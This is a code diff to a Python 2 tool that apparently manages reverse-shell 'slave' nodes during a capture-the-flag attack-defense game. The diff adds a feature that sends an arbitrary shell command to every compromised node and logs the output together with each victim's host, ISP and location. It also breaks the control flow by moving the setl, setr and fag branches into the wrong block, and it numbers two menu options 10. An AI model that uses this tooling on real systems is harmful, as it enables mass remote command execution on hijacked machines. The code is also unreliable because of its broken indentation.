@@ -14,8 +14,12 @@ import signal
 import requests
 import json
 import pprint
+import sys
 
 from utils.log import Log
+
+reload(sys)
+sys.setdefaultencoding('utf-8')
 
 slaves = {}
 masters = {}
@@ -131,6 +135,21 @@ class Slave():
             self.remove_node()
             return False
 
+    def send_command_log(self, command):
+        log_file = "%s-%s.log" % (time.strftime("%Y-%m-%d_%H:%M:%S", time.localtime()), command.encode("base64").replace("\n", ""))
+        Log.info("Log file : %s" % (log_file))
+        self.send_command(command)
+        time.sleep(0.125)
+        result = recvall(self.socket_fd)
+        Log.success(result)
+        with open(log_file, "a+") as f:
+            f.write("[%s]\n" % ("-" * 0x20))
+            f.write("From : %s:%d\n" % (self.hostname, self.port))
+            f.write(u"ISP : %s-%s\n" % (self.country, self.isp))
+            f.write(u"Location : %s-%s-%s\n" % (self.area, self.region, self.city))
+            f.write("Command : %s\n" % (command))
+            f.write("%s\n" % (result))
+
     def send_command_print(self, command):
         self.send_command(command)
         time.sleep(0.125)
@@ -230,6 +249,7 @@ def show_commands():
     print "        5. [gf] : get flag"
     print "        6. [gaf] : get all flag"
     print "        7. [c] : command for all"
+    print "        10. [cl] : command to log"
     print "        8. [setl] : set local execute"
     print "        9. [setr] : set remote execute"
     print "        10. [d] : delete node"
@@ -299,6 +319,12 @@ def main():
             for i in slaves.keys():
                 slave = slaves[i]
                 result = slave.send_command_print(command)
+        elif command == "cl":
+            command = raw_input("Input command (uname -r) : ") or ("uname -r")
+            Log.info("Command : %s" % (command))
+            for i in slaves.keys():
+                slave = slaves[i]
+                result = slave.send_command_log(command)
         elif command == "g":
             input_node_hash = raw_input(
                 "Please input target node hash : ") or position
@@ -319,13 +345,13 @@ def main():
             if not found:
                 Log.error("Please check your input node hash!")
                 Log.error("Position is not changed!")
-        elif command == "setl":
-            EXEC_LOCAL = True
-        elif command == "setr":
-            EXEC_LOCAL = False
-        elif command == "fag":
-            flag_path = raw_input(
-                "Input flag path (/flag.txt) : ") or ("/flag.txt")
+            elif command == "setl":
+                EXEC_LOCAL = True
+            elif command == "setr":
+                EXEC_LOCAL = False
+            elif command == "fag":
+                flag_path = raw_input(
+                    "Input flag path (/flag.txt) : ") or ("/flag.txt")
             box_host = raw_input("Input flag box host (192.168.187.128) : ") or (
                 "192.168.187.128")
             box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
